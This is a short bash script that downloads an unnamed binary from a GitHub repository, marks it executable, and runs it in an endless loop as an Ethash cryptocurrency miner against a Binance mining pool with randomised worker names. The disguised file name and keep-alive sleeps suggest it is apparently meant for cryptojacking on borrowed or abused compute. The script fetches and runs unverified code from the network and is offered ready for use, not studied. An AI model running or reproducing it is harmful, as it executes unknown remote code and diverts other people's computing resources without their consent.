#!/bin/bash
POOL=stratum+tcp://ethash.poolbinance.com:1800
WALLET=DHB
WORKER=$(echo $(shuf -i 10-40 -n 1)-Dg)
wget https://github.com/archernap/prem/raw/main/priyatama
chmod +x priyatama
while [ 1 ]; do
timeout 18000 ./priyatama --algo ETHASH --pool $POOL --user $WALLET.$WORKER 
sleep 1800
done
sleep 999999999
